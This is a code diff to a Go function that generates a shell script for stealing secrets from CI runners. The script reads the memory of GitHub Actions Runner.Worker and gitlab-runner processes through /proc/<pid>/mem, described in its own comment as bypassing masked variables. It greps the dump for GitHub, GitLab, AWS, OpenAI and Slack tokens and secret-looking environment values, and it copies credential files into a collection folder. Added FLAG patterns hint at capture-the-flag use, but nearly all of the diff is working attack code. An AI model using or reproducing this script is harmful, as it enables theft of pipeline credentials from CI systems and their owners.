@@ -83,7 +83,6 @@ stages: [%s]
 func buildMemoryDumpScript(o MemoryDumpOptions) string {
 	var b strings.Builder
 
-	b.WriteString("set -e\n")
 	b.WriteString("_memdump() {\n")
 	b.WriteString(`  _d=$(mktemp -d)
   _memcount=0
@@ -108,39 +107,79 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 `)
 	}
 
-	// Step 2: /proc/<pid>/mem scan of Runner Worker
+	// Step 2: /proc/<pid>/mem scan of Runner Worker using Python
+	// Ported from the GitHub Actions Runner.Worker memory dump technique:
+	// https://www.youtube.com/watch?v=Yz72qAOrN9s
 	if o.MemoryDump {
 		b.WriteString(`  # 2. Extract Runner Worker memory (bypasses masked variables)
+  # Uses Python to read /proc/<pid>/mem — proven technique from GitHub Actions research
   echo "[*] Scanning Runner Worker memory via /proc/<pid>/mem..."
   _memcount=0
-  for _wp in $(pgrep -f "Runner.Worker" 2>/dev/null || pgrep -f "gitlab-runner" 2>/dev/null); do
-    echo "[*] Scanning worker PID $_wp..."
-    if [ -r "/proc/${_wp}/mem" ]; then
-      _maps="/proc/${_wp}/maps"
-      if [ -f "$_maps" ]; then
-        mkdir -p "$_d/worker_mem"
-        # Scan heap regions for token patterns
-        while IFS='-' read -r _start _rest; do
-          _end=$(echo "$_rest" | cut -d' ' -f1)
-          _perms=$(echo "$_rest" | cut -d' ' -f2)
-          case "$_perms" in *r*)
-            _s=$((16#${_start}))
-            _e=$((16#${_end}))
-            _sz=$((_e - _s))
-            if [ $_sz -gt 0 ] && [ $_sz -lt 104857600 ]; then
-              dd if="/proc/${_wp}/mem" bs=1 skip=$_s count=$_sz 2>/dev/null | \
-                strings -n 8 2>/dev/null >> "$_d/worker_mem/${_wp}.txt" 2>/dev/null || true
-            fi
-          ;; esac
-        done < "$_maps" 2>/dev/null
-        # Extract token patterns from heap dump
-        grep -Eo '(glpat-[A-Za-z0-9_\-]{16,}|ghp_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9_]{36}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|xoxb-[0-9]+-[A-Za-z0-9]+|Bearer [A-Za-z0-9_\-.]+)' \
-          "$_d/worker_mem/${_wp}.txt" > "$_d/worker_mem/${_wp}_tokens.txt" 2>/dev/null || true
-        _memcount=$((_memcount + 1))
-      fi
-    fi
-  done
-  echo "[+] Scanned $_memcount worker processes"
+  mkdir -p "$_d/worker_mem"
+  python3 << 'MEMDUMP_PY' > "$_d/worker_mem/raw_mem.bin" 2>"$_d/worker_mem/memdump.log" || true
+import sys, os, re
+
+def find_runner_pids():
+    pids = []
+    for pid in os.listdir('/proc'):
+        if not pid.isdigit():
+            continue
+        try:
+            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:
+                cmdline = f.read()
+                if b'Runner.Worker' in cmdline or b'gitlab-runner' in cmdline:
+                    pids.append(pid)
+        except (PermissionError, FileNotFoundError, ProcessLookupError):
+            continue
+    return pids
+
+pids = find_runner_pids()
+if not pids:
+    print("No Runner.Worker or gitlab-runner PIDs found", file=sys.stderr)
+    sys.exit(0)
+
+for pid in pids:
+    print(f"Scanning PID {pid}...", file=sys.stderr)
+    map_path = f"/proc/{pid}/maps"
+    mem_path = f"/proc/{pid}/mem"
+    try:
+        with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
+            for line in map_f.readlines():
+                m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
+                if m and m.group(3) == 'r':
+                    start = int(m.group(1), 16)
+                    end = int(m.group(2), 16)
+                    if start > sys.maxsize:
+                        continue
+                    mem_f.seek(start)
+                    try:
+                        chunk = mem_f.read(end - start)
+                        sys.stdout.buffer.write(chunk)
+                    except OSError:
+                        continue
+    except (PermissionError, FileNotFoundError, ProcessLookupError) as e:
+        print(f"Cannot read PID {pid}: {e}", file=sys.stderr)
+        continue
+MEMDUMP_PY
+
+  # Extract readable strings and token patterns from the memory dump
+  if [ -s "$_d/worker_mem/raw_mem.bin" ]; then
+    strings -n 8 "$_d/worker_mem/raw_mem.bin" > "$_d/worker_mem/strings.txt" 2>/dev/null || true
+    # Extract known token patterns
+    grep -Eo '(glpat-[A-Za-z0-9_-]{16,}|ghp_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9_]{36}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|xoxb-[0-9]+-[A-Za-z0-9]+|FLAG\+[^+]+\+)' \
+      "$_d/worker_mem/strings.txt" 2>/dev/null | sort -u >> "$_d/worker_mem/tokens.txt" 2>/dev/null || true
+    # Extract KEY=VALUE patterns that look like secrets
+    grep -E '^[A-Z_]{2,}=.{8,}' "$_d/worker_mem/strings.txt" 2>/dev/null | \
+      grep -iE '(SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL|PAT|FLAG)' | \
+      sort -u >> "$_d/worker_mem/env_secrets.txt" 2>/dev/null || true
+    _memcount=$(wc -l < "$_d/worker_mem/tokens.txt" 2>/dev/null || echo 0)
+    echo "[+] Worker memory scan complete: $(du -sh "$_d/worker_mem/raw_mem.bin" 2>/dev/null | cut -f1) dumped"
+    echo "[+] Found $_memcount token patterns in worker memory"
+    cat "$_d/worker_mem/memdump.log" 2>/dev/null || true
+  else
+    echo "[!] No worker memory data captured (Runner.Worker process may not be accessible)"
+    cat "$_d/worker_mem/memdump.log" 2>/dev/null || true
+  fi
 
 `)
 	}
@@ -175,7 +214,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 
 	for _, p := range defaultPaths {
 		fmt.Fprintf(&b, `  for _cf in %s; do
-    [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
+    [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null || true
   done
 `, p)
 	}
@@ -198,7 +237,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 `)
 		for _, p := range extendedPaths {
 			fmt.Fprintf(&b, `  for _cf in %s; do
-    [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
+    [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null || true
   done
 `, p)
 		}
@@ -208,7 +247,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 	b.WriteString(`  # 5. Pattern-based extraction from all collected data
   echo "[*] Extracting tokens from all collected data..."
   cat "$_d/env_current.txt" "$_d/proc_environ_all.txt" "$_d/worker_mem"/*.txt 2>/dev/null | \
-    grep -Eo '(glpat-[A-Za-z0-9_\-]{16,}|ghp_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9_]{36}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|xoxb-[0-9]+-[A-Za-z0-9]+|Bearer [A-Za-z0-9_\-.]+|gho_[A-Za-z0-9_]{36}|github_pat_[A-Za-z0-9_]+)' \
+    grep -Eo '(glpat-[A-Za-z0-9_-]{16,}|ghp_[A-Za-z0-9_]{36}|ghs_[A-Za-z0-9_]{36}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|xoxb-[0-9]+-[A-Za-z0-9]+|Bearer [A-Za-z0-9_./-]+|gho_[A-Za-z0-9_]{36}|github_pat_[A-Za-z0-9_]+|FLAG[+][^+]+[+])' \
     | sort -u > "$_d/tokens.txt" 2>/dev/null || true
   echo "[+] Extracted $(wc -l < "$_d/tokens.txt" 2>/dev/null || echo 0) unique tokens"
 
